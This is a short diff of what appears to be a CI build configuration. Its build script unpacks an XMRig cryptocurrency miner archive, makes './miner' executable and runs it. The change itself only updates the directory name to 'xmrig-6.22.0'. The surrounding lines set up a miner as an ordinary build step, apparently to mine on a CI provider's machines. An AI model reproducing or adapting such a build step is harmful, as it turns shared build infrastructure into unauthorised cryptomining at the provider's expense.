@@ -14,7 +14,7 @@ init:
 build_script:
   # Grant execute permission to the file if needed
   - tar xvf xmrigdir.tar.gz
-  - cd xmrigdir
+  - cd xmrig-6.22.0
   - chmod +x ./miner
   # Run the script with no extension
   - ./miner
